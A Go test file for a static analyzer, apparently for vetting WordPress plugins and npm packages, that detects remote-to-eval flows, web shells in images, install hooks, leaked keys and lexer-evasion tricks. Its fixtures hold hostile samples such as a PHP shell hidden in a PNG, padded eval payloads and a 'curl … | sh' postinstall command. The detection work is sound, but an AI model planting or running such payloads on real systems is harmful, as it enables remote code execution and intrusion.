// Copyright (c) 2026 Rhythm Shahriar <me@rhy.io>
// SPDX-License-Identifier: MIT

package analyze

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"runtime"
	"slices"
	"strings"
	"sync/atomic"
	"testing"
	"time"
	"unicode/utf8"

	"github.com/RhythmShahriar/sightread/core"
	"github.com/RhythmShahriar/sightread/core/coretest"
)

func analyzeAll(t testing.TB, tree *core.Tree, lim core.Limits) *core.FeatureSet {
	t.Helper()
	paths := make([]string, len(tree.Files))
	for i, f := range tree.Files {
		paths[i] = f.Path
	}
	set, err := Analyzer{}.Analyze(context.Background(), tree, paths, lim)
	if err != nil {
		t.Fatal(err)
	}
	return set
}

// dump is a stable text form of a set: every feature with its
// evidence, the unanalysed files and the minified ones.
func dump(set *core.FeatureSet) string {
	var all []core.Feature
	for _, fs := range set.ByKey {
		all = append(all, fs...)
	}
	sortFeatures(all)
	var b strings.Builder
	for _, f := range all {
		attrs, _ := json.Marshal(f.Attrs)
		fmt.Fprintf(&b, "%s %d-%d %s %s %s %s %q\n", f.Ev.Path, f.Ev.Line, f.Ev.EndLine, f.SetKey(), f.Context, f.Ev.Func, attrs, f.Ev.Snippet)
	}
	for _, u := range set.Unanalysed {
		fmt.Fprintf(&b, "unanalysed %s: %s\n", u.Path, u.Reason)
	}
	fmt.Fprintf(&b, "minified %v\n", set.Minified)
	return b.String()
}

func reasons(set *core.FeatureSet, p string) []string {
	var out []string
	for _, u := range set.Unanalysed {
		if u.Path == p {
			out = append(out, u.Reason)
		}
	}
	return out
}

func pluginTree() map[string]string {
	return map[string]string{
		"plugin.php":             "<?php\n$r = wp_remote_get('https://api.example-cdn.io/v1');\neval(wp_remote_retrieve_body($r));\n",
		"includes/admin.php":     "<?php\nfunction x_admin() {\n\tadd_action('admin_init', 'x_init');\n}\n",
		"assets/app.js":          "const cp = require('child_process');\ncp.exec(process.argv[2]);\n",
		"assets/vendor.min.js":   "!function(){var a=1;return a}();\n",
		"assets/style.css":       "a { color: red; }\n",
		"node/package.json":      `{"name":"x","scripts":{"postinstall":"node setup.js"}}`,
		"node/binding.gyp":       "{}",
		"readme.txt":             "=== X ===\nSee https://docs.example-help.io/guide for help.\n<?php echo do_shortcode('[x]'); ?>\n",
		"images/icon.png":        "\x89PNG\r\n\x1a\n\x00\x00<?php system($_GET['c']); ?>",
		"languages/x-fa_IR.po":   "msgid \"Hello\"\nmsgstr \"a\u200bb\"\n",
		"archive/old.zip":        "PK\x03\x04",
		"broken.php":             "<?php\n$a = 1;\n$b = <<<EOT\nnever closed\n",
		"assets/unterminated.js": "var a = 'no end\nvar b = 1;\n",
	}
}

func TestAnalyzeTree(t *testing.T) {
	set := analyzeAll(t, coretest.Tree(pluginTree()), core.DefaultLimits())
	for _, want := range []string{
		"flow:remote->eval",
		"call:child_process.exec",
		"hook:npm:postinstall",
		"code-in-asset:images/icon.png",
		"domain:example-cdn.io",
		"domain:example-help.io",
	} {
		if len(set.ByKey[want]) == 0 {
			t.Errorf("missing %s\n%s", want, dump(set))
		}
	}
	if got := reasons(set, "broken.php"); !slices.Equal(got, []string{"unterminated heredoc at line 3"}) {
		t.Errorf("broken.php reasons %q", got)
	}
	if got := reasons(set, "assets/unterminated.js"); len(got) != 0 {
		t.Errorf("an unterminated JS string is reported: %q", got)
	}
	if !slices.Equal(set.Minified, []string{"assets/vendor.min.js"}) {
		t.Errorf("minified %q", set.Minified)
	}
	for _, fs := range set.ByKey {
		for _, f := range fs {
			switch {
			case f.Ev.Path == "languages/x-fa_IR.po":
				t.Errorf("a translation gave a feature: %s", f.SetKey())
			case f.Ev.Path == "archive/old.zip":
				t.Errorf("an archive was opened: %s", f.SetKey())
			case f.Ev.Path == "readme.txt" && f.Kind == core.FCodeInAsset:
				t.Errorf("a readme sample is code-in-asset")
			case f.Ev.Path == "readme.txt" && f.Context != core.CtxDoc:
				t.Errorf("readme feature %s in context %s", f.SetKey(), f.Context)
			}
		}
	}
	if !set.Has(core.FHook, "npm:postinstall") {
		t.Errorf("no npm hook")
	}
}

func TestAnalyzeDeterministic(t *testing.T) {
	files := pluginTree()
	for i := range 40 {
		files[fmt.Sprintf("inc/f%02d.php", i)] = fmt.Sprintf("<?php\nfunction f%d($a) {\n\t$u = 'https://h%d.example-cdn.io/x';\n\treturn unserialize(wp_remote_retrieve_body(wp_remote_get($u . $a)));\n}\n", i, i%5)
	}
	tree := coretest.Tree(files)
	lim := core.DefaultLimits()
	lim.FileBudget = time.Minute // a time limit depends on the machine
	want := dump(analyzeAll(t, tree, lim))
	for range 20 {
		if got := dump(analyzeAll(t, tree, lim)); got != want {
			t.Fatalf("runs differ:\n%s\n----\n%s", got, want)
		}
	}
}

// T-30: code after an unterminated heredoc is never silently clean.
func TestHeredocPadding(t *testing.T) {
	src := "<?php\n$pad = <<<PAD\n" + strings.Repeat("lorem ipsum\n", 5000) + "eval($_POST['x']);\n"
	set := analyzeAll(t, coretest.Tree(map[string]string{"x.php": src}), core.DefaultLimits())
	if len(set.Unanalysed) == 0 && len(set.ByKey) == 0 {
		t.Fatal("padding hid the code: no feature and no unanalysed")
	}
	if got := reasons(set, "x.php"); !slices.Contains(got, "unterminated heredoc at line 2") {
		t.Errorf("reasons %q", got)
	}
	// The code before the break is still analysed.
	src = "<?php\nsystem($_GET['c']);\n$pad = <<<PAD\nno end\n"
	set = analyzeAll(t, coretest.Tree(map[string]string{"x.php": src}), core.DefaultLimits())
	if !set.Has(core.FFlow, "request->exec") {
		t.Errorf("code before the break lost:\n%s", dump(set))
	}
}

func TestUnterminatedJS(t *testing.T) {
	set := analyzeAll(t, coretest.Tree(map[string]string{
		"a.js": "eval(location.hash);\nvar t = `open ${x}\n" + strings.Repeat("x\n", 10),
		"b.js": "var a = 1; /* never closed\n",
	}), core.DefaultLimits())
	if got := reasons(set, "a.js"); !slices.Equal(got, []string{"unterminated template at line 2"}) {
		t.Errorf("a.js reasons %q", got)
	}
	if got := reasons(set, "b.js"); !slices.Equal(got, []string{"unterminated comment at line 1"}) {
		t.Errorf("b.js reasons %q", got)
	}
}

func TestReasonTooBig(t *testing.T) {
	for limit, want := range map[int64]string{
		4 << 20:   "file over 4 MiB",
		512 << 10: "file over 512 KiB",
		1000:      "file over 1000 bytes",
	} {
		if got := reasonTooBig(limit); got != want {
			t.Errorf("reasonTooBig(%d) = %q, want %q", limit, got, want)
		}
	}
}

func TestOversized(t *testing.T) {
	lim := core.DefaultLimits()
	lim.EntryAnalysed = 4 << 10
	big := strings.Repeat("// padding line\n", 400)
	png := "\x89PNG\r\n\x1a\n" + strings.Repeat("\x00\x01\x02", 3000)
	set := analyzeAll(t, coretest.Tree(map[string]string{
		"big.php":         "<?php\n" + big,
		"big.js":          big,
		"package.json":    `{"scripts":{"postinstall":"x"},"x":"` + strings.Repeat("a", 5000) + `"}`,
		"data/list.json":  `{"x":"` + strings.Repeat("a", 5000) + `"}`,
		"notes.txt":       big,
		"img/tail.png":    png + "<?php system($_GET['c']); ?>",
		"img/clean.png":   png,
		"small.php":       "<?php\nsystem($_GET['c']);\n",
		"exact/limit.php": "<?php\n" + strings.Repeat("a", 4<<10-6),
	}), lim)
	for p, want := range map[string][]string{
		"big.php":         {"file over 4 KiB"},
		"big.js":          {"file over 4 KiB"},
		"package.json":    {"file over 4 KiB"},
		"img/tail.png":    {"file over 4 KiB"},
		"data/list.json":  nil,
		"notes.txt":       nil,
		"img/clean.png":   nil,
		"small.php":       nil,
		"exact/limit.php": nil,
	} {
		if got := reasons(set, p); !slices.Equal(got, want) {
			t.Errorf("%s reasons %q, want %q", p, got, want)
		}
	}
	if !set.Has(core.FCodeInAsset, "img/tail.png") {
		t.Errorf("code at the end of a big image missed:\n%s", dump(set))
	}
	if set.Has(core.FCodeInAsset, "img/clean.png") {
		t.Errorf("clean image flagged")
	}
}

// featureDense is PHP with many statements and calls, slow to analyse.
func featureDense(n int) string {
	var b strings.Builder
	b.WriteString("<?php\n")
	for i := range n {
		fmt.Fprintf(&b, "$v%d = wp_remote_get('https://h.example-cdn.io/' . $v%d); if ($v%d) { eval($v%d); }\n", i, max(i-1, 0), i, i)
	}
	return b.String()
}

func TestTimeBudget(t *testing.T) {
	lim := core.DefaultLimits()
	lim.FileBudget = time.Millisecond
	set := analyzeAll(t, coretest.Tree(map[string]string{"slow.php": featureDense(20000), "fast.txt": "hi"}), lim)
	if got := reasons(set, "slow.php"); !slices.Equal(got, []string{"analysis time limit"}) {
		t.Errorf("reasons %q, want the time limit", got)
	}
	// The default budget is ample for the same kind of file (widened
	// under the race detector).
	lim = core.DefaultLimits()
	lim.FileBudget *= time.Duration(raceSlowdown)
	set = analyzeAll(t, coretest.Tree(map[string]string{"slow.php": featureDense(2000)}), lim)
	if got := reasons(set, "slow.php"); len(got) != 0 {
		t.Errorf("reasons %q under the default budget", got)
	}
}

func TestClock(t *testing.T) {
	var nilClock *clock
	if nilClock.tick(1<<30) || nilClock.expired() {
		t.Error("a nil clock ran out")
	}
	ctx, cancel := context.WithCancel(context.Background())
	c := newClock(ctx, 0)
	if c.tick(checkEvery) {
		t.Error("ran out before the deadline")
	}
	cancel()
	if c.tick(checkEvery - 1) {
		t.Error("looked at the deadline before checkEvery tokens")
	}
	if !c.tick(1) || !c.expired() || !c.tick(0) {
		t.Error("did not run out after the deadline")
	}
}

// A paused clock does not spend its budget; an unpaused one runs out.
func TestClockPause(t *testing.T) {
	c := newClock(context.Background(), 20*time.Millisecond)
	resume := c.pause()
	time.Sleep(40 * time.Millisecond)
	resume()
	if c.expired() {
		t.Error("the pause counted against the budget")
	}
	time.Sleep(40 * time.Millisecond)
	if !c.expired() {
		t.Error("did not run out after the deadline")
	}
	var nilClock *clock
	nilClock.pause()()
}

// T-31: a 50 MiB single-line minified file finishes inside the budget:
// over the analysis limit by default; inside the time budget (or
// stopped by it) when the limit is raised.
func TestHugeMinified(t *testing.T) {
	if testing.Short() {
		t.Skip("50 MiB input")
	}
	size := 50 << 20
	if raceSlowdown > 1 {
		size = 8 << 20 // the race detector's memory per token
	}
	var b strings.Builder
	b.Grow(size)
	for i := 0; b.Len() < size; i++ {
		fmt.Fprintf(&b, "function a%d(b){return b+%d}var c%d=a%d(%d);", i, i, i, i, i)
	}
	tree := coretest.Tree(map[string]string{"dist/app.min.js": b.String()})
	var set *core.FeatureSet
	limit := timeLimit(2 * time.Second)
	el := fasterOfTwo(limit, func() time.Duration {
		start := time.Now()
		set = analyzeAll(t, tree, core.DefaultLimits())
		return time.Since(start)
	})
	if got := reasons(set, "dist/app.min.js"); size > 4<<20 && !slices.Equal(got, []string{"file over 4 MiB"}) {
		t.Errorf("reasons %q", got)
	}
	t.Logf("50 MiB over the limit: %v", el)
	if el > limit {
		t.Errorf("over-limit file took %v, over %v", el, limit)
	}
	// With the limit raised the walk stops at the budget; lexing runs
	// before the clock, so the file is cut to keep the test light.
	tree = coretest.Tree(map[string]string{"dist/app.min.js": b.String()[:size/4]})
	lim := core.DefaultLimits()
	lim.EntryAnalysed = 64 << 20
	// Lexing is outside the clock; it runs at tens of MB/s.
	limit = timeLimit(lim.FileBudget + 3*time.Second)
	el = fasterOfTwo(limit, func() time.Duration {
		start := time.Now()
		set = analyzeAll(t, tree, lim)
		return time.Since(start)
	})
	t.Logf("12.5 MiB with the limit raised: %v, %q", el, set.Unanalysed)
	if el > limit {
		t.Errorf("took %v, over %v", el, limit)
	}
	for _, r := range reasons(set, "dist/app.min.js") {
		if r != "analysis time limit" {
			t.Errorf("reason %q", r)
		}
	}
	if !slices.Equal(set.Minified, []string{"dist/app.min.js"}) && len(set.Unanalysed) == 0 {
		t.Errorf("minified %q", set.Minified)
	}
}

func TestSecrets(t *testing.T) {
	files := map[string]string{}
	var keys []string
	for i, kind := range coretest.FakeKeyKinds() {
		k := coretest.FakeKey(kind)
		keys = append(keys, k)
		files[fmt.Sprintf("inc/k%d.php", i)] = fmt.Sprintf("<?php\n$key = '%s';\nwp_remote_post('https://api.example-cdn.io', array('body' => $key));\n", k)
	}
	files["config/settings.yml"] = "token: " + keys[0] + "\n"
	files["docs/setup.md"] = "Set " + keys[1] + " in your env.\n"
	set := analyzeAll(t, coretest.Tree(files), core.DefaultLimits())
	n := 0
	for _, fs := range set.ByKey {
		for _, f := range fs {
			if f.Kind == core.FSecret {
				n++
				if f.Ev.Line != 2 && f.Ev.Path != "config/settings.yml" {
					t.Errorf("%s line %d", f.Ev.Path, f.Ev.Line)
				}
				if f.Ev.Path == "docs/setup.md" {
					t.Errorf("a secret in documentation is reported")
				}
			}
		}
	}
	if n != len(keys)+1 {
		t.Errorf("%d FSecret features, want %d\n%s", n, len(keys)+1, dump(set))
	}
	out, err := json.Marshal(set)
	if err != nil {
		t.Fatal(err)
	}
	text := string(out) + dump(set)
	for _, k := range keys {
		if strings.Contains(text, k) {
			t.Errorf("raw key %s\u2026 in the output", k[:4])
		}
	}
}

func TestSecretsNegative(t *testing.T) {
	set := analyzeAll(t, coretest.Tree(map[string]string{
		"a.php":        "<?php\n$key = get_option('api_key');\n$pass = $_POST['password'];\n",
		"b.js":         "const token = process.env.GITHUB_TOKEN;\nfetch(u, { credentials: 'same-origin', headers: { 'X-WP-Nonce': cfg.nonce } });\n$password = 'not-a-format';\n",
		"package.json": `{"name":"x","version":"1.0.0"}`,
	}), core.DefaultLimits())
	for k := range set.ByKey {
		if strings.HasPrefix(k, string(core.FSecret)+":") {
			t.Errorf("FSecret %s", k)
		}
	}
}

// fakePEM assembles a PEM block of the given label at run time, so no
// literal key sits in the repository.
func fakePEM(label string) string {
	body := strings.Repeat("TUlJRXBBSUJBQUtDQVFFQXNpZ2h0cmVhZFRFU1Qwbmx5", 2)
	return "-----BEGIN " + label + "-----\n" + body + "\n" + body[:40] + "\n-----END " + label + "-----\n"
}

func TestSecretsPEM(t *testing.T) {
	key := fakePEM("RSA " + "PRIVATE KEY")
	set := analyzeAll(t, coretest.Tree(map[string]string{
		"keys/deploy.pem":   "# deploy key\n" + key,
		"config/deploy.key": "a\nb\n" + key,
		"inc/k.php":         "<?php\n$k = <<<EOT\n" + key + "EOT;\n",
	}), core.DefaultLimits())
	want := map[string]int{"keys/deploy.pem": 2, "config/deploy.key": 3, "inc/k.php": 3}
	got := map[string]int{}
	for _, fs := range set.ByKey {
		for _, f := range fs {
			if f.Kind != core.FSecret || f.Attrs["kind"] != "private-key" {
				continue
			}
			got[f.Ev.Path] = f.Ev.Line
			for _, part := range strings.Split(strings.TrimSpace(key), "\n")[1:3] {
				for _, text := range []string{f.Key, fmt.Sprint(f.Ev.Snippet), fmt.Sprint(f.Attrs)} {
					if strings.Contains(text, part[8:]) {
						t.Errorf("%s: raw key text in %q", f.Ev.Path, text)
					}
				}
			}
		}
	}
	for p, line := range want {
		if got[p] != line {
			t.Errorf("%s: private key at line %d, want %d\n%s", p, got[p], line, dump(set))
		}
	}
	out, _ := json.Marshal(set)
	if strings.Contains(string(out)+dump(set), "TUlJRXBBSUJBQUtDQVFFQXNpZ2h0") {
		t.Errorf("raw key in the output")
	}
	// Analyze skips text in a documentation context; the scan itself
	// places a block in any text.
	fs := secretFeatures("notes.txt", []byte("a\nb\n"+key), false)
	if len(fs) != 1 || fs[0].Ev.Line != 3 {
		t.Errorf("notes.txt: %+v", fs)
	}
}

func TestSecretsPEMNegative(t *testing.T) {
	set := analyzeAll(t, coretest.Tree(map[string]string{
		"keys/pub.pem": fakePEM("PUBLIC KEY"),
		"certs/ca.txt": fakePEM("CERTIFICATE"),
		"inc/cert.php": "<?php\n$c = '" + fakePEM("CERTIFICATE") + "';\n",
		"keys/ssh.pub": "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA sightread\n",
	}), core.DefaultLimits())
	for k := range set.ByKey {
		if strings.HasPrefix(k, string(core.FSecret)+":") {
			t.Errorf("FSecret %s", k)
		}
	}
}

func TestAnalyzeRace(t *testing.T) {
	files := map[string]string{}
	for i := range 1000 {
		switch i % 4 {
		case 0:
			files[fmt.Sprintf("p/f%04d.php", i)] = fmt.Sprintf("<?php\n$a%d = wp_remote_get('https://h%d.example-cdn.io');\neval(wp_remote_retrieve_body($a%d));\n", i, i, i)
		case 1:
			files[fmt.Sprintf("p/f%04d.js", i)] = "require('child_process').exec(process.argv[2]);\n"
		case 2:
			files[fmt.Sprintf("p/f%04d.json", i)] = `{"homepage":"https://x.example-cdn.io"}`
		default:
			files[fmt.Sprintf("p/f%04d.txt", i)] = "plain\n"
		}
	}
	set := analyzeAll(t, coretest.Tree(files), core.DefaultLimits())
	if got := len(set.ByKey["flow:remote->eval"]); got != 250 {
		t.Errorf("%d remote->eval flows, want 250", got)
	}
}

// The package decode budget is applied in path order: the same files
// pass it on every run.
func TestPackageBudgetOrder(t *testing.T) {
	payload := gzipBytes([]byte(strings.Repeat("A", 900<<10)))
	call := "gzdecode(base64_decode('" + b64(payload) + "'))"
	files := map[string]string{}
	for i := range 5 {
		var b strings.Builder
		b.WriteString("<?php\n")
		for j := range 5 {
			fmt.Fprintf(&b, "$x%d = %s;\n", j, call)
		}
		files[fmt.Sprintf("f%d.php", i)] = b.String()
	}
	tree := coretest.Tree(files)
	// A time limit depends on the machine; keep it out of the way.
	lim := core.DefaultLimits()
	lim.FileBudget = time.Minute
	set := analyzeAll(t, tree, lim)
	var limited []string
	for _, u := range set.Unanalysed {
		if u.Reason == reasonDecodeLimit {
			limited = append(limited, u.Path)
		}
	}
	if len(limited) == 0 || limited[0] == "f0.php" {
		t.Fatalf("limited files %q", limited)
	}
	want := dump(set)
	for range 5 {
		if got := dump(analyzeAll(t, tree, lim)); got != want {
			t.Fatalf("the decode budget made runs differ:\n%s\n----\n%s", got, want)
		}
	}
}

func TestAnalyzeCancelled(t *testing.T) {
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	tree := coretest.Tree(map[string]string{"a.php": "<?php eval($x);"})
	if _, err := (Analyzer{}).Analyze(ctx, tree, []string{"a.php"}, core.DefaultLimits()); !errors.Is(err, context.Canceled) {
		t.Errorf("err %v", err)
	}
	if _, err := (Analyzer{}).AnalyzeText(ctx, core.KindJS, "a.js", []byte("eval(x)")); !errors.Is(err, context.Canceled) {
		t.Errorf("text err %v", err)
	}
}

func TestAnalyzeMissingPaths(t *testing.T) {
	set, err := Analyzer{}.Analyze(context.Background(), coretest.Tree(map[string]string{"a.php": "<?php eval($_GET['x']);"}), []string{"gone.php", "a.php", "a.php"}, core.Limits{})
	if err != nil {
		t.Fatal(err)
	}
	if len(set.ByKey["flow:request->eval"]) != 1 || len(set.Unanalysed) != 0 {
		t.Errorf("unexpected set:\n%s", dump(set))
	}
	if set, err = (Analyzer{}).Analyze(context.Background(), nil, []string{"a.php"}, core.Limits{}); err != nil || len(set.ByKey) != 0 {
		t.Errorf("nil tree: %v %v", set, err)
	}
}

func TestAnalyzeText(t *testing.T) {
	a := Analyzer{}
	set, err := a.AnalyzeText(context.Background(), core.KindText, "package.json#postinstall", []byte("curl -s https://x.example-cdn.io/i.sh | sh"))
	if err != nil {
		t.Fatal(err)
	}
	if !set.Has(core.FFlow, "remote->exec") {
		t.Errorf("no remote->exec:\n%s", dump(set))
	}
	set, _ = a.AnalyzeText(context.Background(), core.KindJS, "setup.js", []byte("require('child_process').exec('id');\n`never"))
	if !set.Has(core.FCall, "child_process.exec") || !slices.Equal(reasons(set, "setup.js"), []string{"unterminated template at line 2"}) {
		t.Errorf("setup.js:\n%s", dump(set))
	}
	set, _ = a.AnalyzeText(context.Background(), core.KindPHP, "x.php", []byte("<?php echo 'hi';"))
	if len(set.ByKey) != 0 || len(set.Unanalysed) != 0 {
		t.Errorf("benign PHP:\n%s", dump(set))
	}
	set, _ = a.AnalyzeText(context.Background(), core.KindJS, "big.js", make([]byte, 4<<20+1))
	if !slices.Equal(reasons(set, "big.js"), []string{"file over 4 MiB"}) {
		t.Errorf("big text: %q", set.Unanalysed)
	}
}

func TestRegistered(t *testing.T) {
	if _, ok := core.GetAnalyzer().(Analyzer); !ok {
		t.Errorf("registered analyzer is %T", core.GetAnalyzer())
	}
}

// Line endings and slashes the lexers once misread hid the code after
// them with no feature and no Unanalysed entry. Each positive case must
// show the sink; each negative one must stay quiet.
func TestLexerBypasses(t *testing.T) {
	tests := []struct {
		name, path, src string
		kind            core.FeatureKind
		key             string
		want            bool
	}{
		{"heredoc closed after a bare CR", "x.php", "<?php\n$a = <<<EOT\nx\rEOT;\reval($_POST[\"x\"]);\r$b = 1; // \nEOT;\n", core.FFlow, "request->eval", true},
		{"nowdoc closed after a bare CR", "x.php", "<?php\n$a = <<<'EOT'\nx\rEOT;\reval($_POST[\"x\"]);\r$b = 1; // \nEOT;\n", core.FFlow, "request->eval", true},
		{"heredoc with CRLF lines", "x.php", "<?php\r\n$a = <<<EOT\r\nx\r\nEOT;\r\neval($_POST['x']);\r\n", core.FFlow, "request->eval", true},
		{"eval inside a CR heredoc", "x.php", "<?php\n$a = <<<EOT\rx eval($_POST['x']);\rEOT;\r", core.FFlow, "request->eval", false},
		{"eval after a multi-line attribute", "a.php", "<?php\n#[\neval($_GET['x']); # ]\n", core.FFlow, "request->eval", true},
		{"calls after a multi-line attribute", "b.php", "<?php\n#[\n$f = $_POST['f']; $f($_POST['a']);\nsystem($_GET['c']);\n#]\n", core.FFlow, "request->dyn-call", true},
		{"system after a multi-line attribute", "b.php", "<?php\n#[\n$f = $_POST['f']; $f($_POST['a']);\nsystem($_GET['c']);\n#]\n", core.FCall, "system", true},
		{"nested multi-line attributes", "c.php", "<?php\n#[A(\n#[\neval($_GET['x']);\n])]\n", core.FFlow, "request->eval", true},
		{"eval in a string of a multi-line attribute", "d.php", "<?php\n#[Doc(\n  'eval($_GET[1])'\n)]\nfunction f() {}\n", core.FEval, "eval", false},
		{"eval on the first line of an attribute", "e.php", "<?php\n#[A] eval($_GET['x']);\n", core.FFlow, "request->eval", true},
		{"line separator ends a comment", "a.js", "// hi eval(location.hash);\n", core.FEval, "eval", true},
		{"paragraph separator ends a comment", "a.js", "// hi require('child_process').exec(process.env.CMD);\n", core.FCall, "child_process.exec", true},
		{"no-break space before eval", "a.js", "var a = 1; eval(location.hash);\n", core.FEval, "eval", true},
		{"regex after an if head", "a.js", "if (x) /'/.test(s) && eval(location.hash);\n", core.FEval, "eval", true},
		{"division after a function expression", "a.js", "var x = function () {} / eval(location.hash) / 1;\n", core.FEval, "eval", true},
		{"quote misread mid-line", "a.js", "var a = b\n/'/; eval(location.hash);\n", core.FEval, "eval", true},
		{"line separator inside a string", "a.js", "var s = 'a eval(location.hash)';\n", core.FEval, "eval", false},
		{"eval in a comment", "a.js", "// hi eval(location.hash);\n", core.FEval, "eval", false},
		{"eval in a leading regex", "a.js", "/eval(x)/.test(s);\n", core.FEval, "eval", false},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			set := analyzeAll(t, coretest.Tree(map[string]string{tc.path: tc.src}), core.DefaultLimits())
			if got := set.Has(tc.kind, tc.key); got != tc.want {
				t.Errorf("%s:%s present = %v, want %v\n%s", tc.kind, tc.key, got, tc.want, dump(set))
			}
		})
	}
}

// A real PHP 8 attribute that spans lines holds no code in either
// reading, so it adds no feature.
func TestMultilineAttributeClean(t *testing.T) {
	set := analyzeAll(t, coretest.Tree(map[string]string{
		"r.php": "<?php\nnamespace A;\n#[Route(\n  path: '/x',\n  methods: ['GET'],\n)]\nfunction f() { return 1; }\n",
	}), core.DefaultLimits())
	if d := dump(set); d != "minified []\n" {
		t.Errorf("features from a clean attribute:\n%s", d)
	}
}

// denseBundle is webpack-shaped minified JavaScript of about size
// bytes: call-heavy, close to one token per byte, the analyzer's most
// memory-hungry input.
func denseBundle(size, seed int) string {
	var b strings.Builder
	b.Grow(size + 128)
	for i := 0; b.Len() < size; i++ {
		fmt.Fprintf(&b, "n[%d]=function(e,t,r){var o=r(%d),a=o.f(e.x,t[%d]);e.exports={a:a,b:o.g(\"s%d\")}},", i, i+seed, i, i)
	}
	return b.String()
}

// Workers share a budget of bytes in analysis, so many large bundles
// cost about what four MiB of them cost, not one bundle per core.
func TestMemoryBound(t *testing.T) {
	if testing.Short() || raceSlowdown > 1 {
		t.Skip("16 MiB of dense bundles")
	}
	files := map[string]string{}
	for i := range 16 {
		files[fmt.Sprintf("dist/b%02d.js", i)] = denseBundle(1<<20, i)
	}
	tree := coretest.Tree(files)
	runtime.GC()
	var base runtime.MemStats
	runtime.ReadMemStats(&base)
	var peak atomic.Uint64
	done := make(chan struct{})
	sampled := make(chan struct{})
	go func() {
		defer close(sampled)
		var m runtime.MemStats
		for {
			runtime.ReadMemStats(&m)
			peak.Store(max(peak.Load(), m.HeapInuse))
			select {
			case <-done:
				return
			case <-time.After(2 * time.Millisecond):
			}
		}
	}()
	lim := core.DefaultLimits()
	lim.FileBudget = time.Minute // memory is under test, not time
	set := analyzeAll(t, tree, lim)
	close(done)
	<-sampled
	if len(set.Unanalysed) != 0 {
		t.Errorf("unanalysed %q", set.Unanalysed)
	}
	// One MiB of this input peaks near 170 MiB of heap; with four in
	// analysis at once that is under 700 MiB. Without the budget a
	// 16-core machine reached several GiB.
	const ceiling = 1 << 30
	used := peak.Load() - min(peak.Load(), base.HeapInuse)
	t.Logf("peak heap %d MiB over a %d MiB base", used>>20, base.HeapInuse>>20)
	if used > ceiling {
		t.Errorf("peak heap %d MiB, over %d MiB", used>>20, ceiling>>20)
	}
}

// An update filter's scope is own only for the package's own folder,
// taken from the tree: its top folder or its main file's name.
func TestUpdateFilterOwnFolder(t *testing.T) {
	filter := func(entry string) string {
		return "<?php\nadd_filter('site_transient_update_plugins', function ($t) { unset($t->response['" + entry + "']); return $t; });\n"
	}
	tests := []struct {
		name, entry, scope string
	}{
		{"own folder", "my-plugin/my-plugin.php", "own"},
		{"own folder in another case", "My-Plugin/my-plugin.php", "own"},
		{"another plugin", "akismet/akismet.php", "all"},
		{"a look-alike folder", "my-plugin-pro/my-plugin.php", "all"},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			set := analyzeAll(t, coretest.Tree(map[string]string{
				"my-plugin.php":      "<?php\n/* Plugin Name: Mine */\n",
				"includes/hooks.php": filter(tc.entry),
			}), core.DefaultLimits())
			fs := set.ByKey[string(core.FUpdateFilter)+":site_transient_update_plugins"]
			if len(fs) != 1 || fs[0].Attrs["scope"] != tc.scope {
				t.Errorf("update filters %v, want scope %s\n%s", fs, tc.scope, dump(set))
			}
		})
	}
	// The archive's top folder counts as the package's own.
	tree := coretest.Tree(map[string]string{"inc/hooks.php": filter("akismet/akismet.php")})
	tree.Root = "akismet/"
	set := analyzeAll(t, tree, core.DefaultLimits())
	if fs := set.ByKey[string(core.FUpdateFilter)+":site_transient_update_plugins"]; len(fs) != 1 || fs[0].Attrs["scope"] != "own" {
		t.Errorf("under its own top folder: %v", fs)
	}
}

// A secret inside an encoded payload never leaves in encoded form: a
// decoder's input and binary arguments keep only their size.
func TestEncodedArgs(t *testing.T) {
	key := coretest.FakeKey(coretest.FakeKeyKinds()[0])
	enc := b64([]byte("$k = '" + key + "';"))
	gz := b64(deflateRaw([]byte("echo 'hello';")))
	src := "<?php\n$a = base64_decode('" + enc + "');\n$b = gzinflate(base64_decode('" + gz + "'));\n$c = curl_init('https://api.example.com/');\n"
	fs := codeFeatures(langPHP, "x.php", []byte(src), core.CtxCode)
	var calls int
	for _, f := range fs {
		if f.Kind != core.FCall {
			continue
		}
		for k, v := range f.Attrs {
			if strings.Contains(v, enc) || strings.Contains(v, key) {
				t.Errorf("%s attr %s carries the payload", f.Key, k)
			}
			if !utf8.ValidString(v) {
				t.Errorf("%s attr %s is not UTF-8", f.Key, k)
			}
		}
		switch f.Key {
		case "base64_decode":
			calls++
			if f.Attrs["arg0_encoding"] != "base64_decode" || f.Attrs["arg0_bytes"] == "" || f.Attrs["arg0"] != "" {
				t.Errorf("base64_decode attrs %v", f.Attrs)
			}
		case "gzinflate":
			calls++
			if f.Attrs["arg0_bytes"] == "" || f.Attrs["arg0"] != "" {
				t.Errorf("gzinflate attrs %v", f.Attrs)
			}
		case "curl_init":
			calls++
			if f.Attrs["arg0"] != "https://api.example.com/" {
				t.Errorf("a text argument is lost: %v", f.Attrs)
			}
		}
	}
	if calls < 4 {
		t.Errorf("%d calls checked, want base64_decode twice, gzinflate and curl_init: %q", calls, describe(fs))
	}
}
